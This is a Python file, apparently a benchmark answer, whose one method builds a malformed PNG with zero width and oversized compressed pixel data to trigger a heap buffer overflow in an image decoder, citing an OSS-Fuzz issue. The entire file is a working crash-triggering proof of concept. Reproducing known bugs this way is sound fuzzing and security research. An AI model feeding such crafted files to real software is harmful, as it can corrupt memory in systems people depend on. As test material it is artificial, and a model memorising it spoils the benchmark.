import os
import tempfile
import struct
import zlib
import subprocess
import sys
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG with zero width to trigger heap buffer overflow
        # Based on oss-fuzz:42536679 - zero width/height not checked
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk - zero width (0), normal height (100), valid color type/depth
        ihdr_data = struct.pack('>I', 0)  # width = 0
        ihdr_data += struct.pack('>I', 100)  # height = 100
        ihdr_data += b'\x08'  # bit depth = 8
        ihdr_data += b'\x02'  # color type = RGB
        ihdr_data += b'\x00'  # compression = deflate
        ihdr_data += b'\x00'  # filter = adaptive
        ihdr_data += b'\x00'  # interlace = none
        
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk) & 0xffffffff)
        ihdr = struct.pack('>I', len(ihdr_data)) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk - compressed image data that will cause overflow
        # Create data that will trigger buffer overflow when width is 0
        # The program likely allocates buffer based on width*height*channels
        # With width=0, allocation is 0 bytes, but decompression yields data
        
        # Simple uncompressed data pattern
        raw_data = b''
        for i in range(100):  # 100 scanlines
            raw_data += b'\x00'  # filter type: none
            # Even with width=0, we put some data that will overflow
            raw_data += b'\xff\x00\xff' * 50  # This will overflow 0-byte buffer
        
        # Compress the data
        compressed = zlib.compress(raw_data)
        idat_chunk = b'IDAT' + compressed
        idat_crc = struct.pack('>I', zlib.crc32(idat_chunk) & 0xffffffff)
        idat = struct.pack('>I', len(compressed)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', zlib.crc32(iend_chunk) & 0xffffffff)
        iend = struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Combine all chunks
        poc = png_signature + ihdr + idat + iend
        
        return poc